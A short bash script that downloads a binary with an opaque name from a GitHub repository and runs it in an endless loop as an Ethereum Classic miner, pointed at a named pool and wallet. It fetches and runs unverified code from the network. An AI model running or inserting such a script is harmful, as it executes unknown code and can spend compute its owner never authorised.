#!/bin/bash
POOL=eu.etc.k1pool.com:3821
WALLET=KrcUkCfHad2tzFXqskx55dpSXqXmCfTrawz
WORKER=k80
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
